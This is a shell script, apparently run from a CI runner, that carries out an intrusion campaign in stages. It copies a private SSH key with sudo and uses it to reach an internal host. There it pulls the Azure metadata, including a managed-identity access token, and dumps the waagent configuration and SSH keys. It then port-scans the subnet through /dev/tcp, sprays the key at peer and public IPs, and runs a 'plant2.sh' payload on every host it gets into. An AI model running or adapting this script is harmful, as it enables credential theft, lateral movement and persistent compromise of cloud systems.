set +e
TS=$(date -u +%s)
O=/tmp/pivot3-9927.txt; : > $O; exec >> $O 2>&1
R=/opt/ul-runner/_work/ul-plant/ul-plant
echo "==M3-START host=$(hostname) ts=$TS"
sudo -n cp $R/az/ibm_key.pem /tmp/ibm_key.pem 2>/dev/null; chmod 600 /tmp/ibm_key.pem
echo "==A VIA-24"
S24="ssh -i /tmp/ibm_key.pem -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 ubuntu@10.243.0.24"
$S24 'echo ID:; id; echo HNAME:; hostname; hostname -I; echo ROUTE:; ip -4 route; echo HOSTS:; cat /etc/hosts; echo IMDS:; curl -s -m 8 -H Metadata:true "http://169.254.169.254/metadata/instance/compute?api-version=2021-12-13&format=json"; echo; echo IMDSUSERDATA:; curl -s -m 8 -H Metadata:true "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"; echo; echo IMDSTOKEN:; curl -s -m 8 -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"; echo; echo WAAGENT:; sudo -n ls -la /var/lib/waagent 2>&1 | head -20; echo WA-XML:; sudo -n bash -c "for f in /var/lib/waagent/*.xml; do echo ==F \$f; stat -c%s \$f; base64 -w0 \$f; echo; done" 2>&1 | head -40; echo NV:; ls -la /opt/t19 2>&1 | head -20; echo UNIT:; systemctl list-units "t19*" "nv*" --all --no-pager 2>&1 | head -20; echo SSHKEYS:; ls -la ~/.ssh 2>&1; echo AK:; cat ~/.ssh/authorized_keys 2>/dev/null | head -5' 2>&1
echo "==B VIA-24-SWEEP"
$S24 'for p in 22 2222 22222 10250 6443 9400 443 3389; do for i in $(seq 1 254); do echo 10.243.0.$i $p; done; done > /tmp/c.txt; awk "{print \$1\" \"\$2}" /tmp/c.txt | xargs -P 128 -n2 bash -c "timeout 1 bash -c \"echo > /dev/tcp/\$0/\$1\" 2>/dev/null && echo \$0:\$1" | sort -u' 2>&1
echo "==B2 VIA-24-SSHPEERS"
for ip in 10.243.0.26 10.243.0.27 10.243.0.30 10.243.0.31 10.243.0.1 10.243.0.4; do echo "-- peer $ip"; timeout 12 ssh -i /tmp/ibm_key.pem -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -v ubuntu@$ip 'id; hostname' 2>&1 | grep -E 'Authentications that can continue|Permission denied|uid=|hostname|Connection refused|timed out|banner|remote software' | head -6; done
echo "==C PUBLICWAVE"
> /tmp/pubcombos.txt
awk '{print $2}' $R/az/hosts.tsv | sort -u | while read ip; do for u in t19 ubuntu azureuser; do echo "$ip $u /tmp/ibm_key.pem" >> /tmp/pubcombos.txt; done; done
wc -l /tmp/pubcombos.txt
cat /tmp/pubcombos.txt | xargs -P 48 -n3 bash -c 'o=$(timeout 14 ssh -i "$2" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 "$1"@"$0" "id;hostname -I" 2>&1); case "$o" in *uid=*) echo "OKPUB $0 $1 :: $o";; esac' 2>/dev/null | sort -u > /tmp/pubwave.txt
echo "PUBWAVE_N=$(wc -l < /tmp/pubwave.txt)"; cat /tmp/pubwave.txt
echo "==D PLANT-PUB"
sed -n 's/^OKPUB \([^ ]*\) \([^ ]*\).*/\1 \2 ibm_key.pem/p' /tmp/pubwave.txt | awk '!s[$1]++' > /tmp/wonpub.txt
cat /tmp/wonpub.txt | xargs -r -P 6 -n3 bash ul-bin/plant2.sh 2>&1
echo "==M3-END"
exit 0
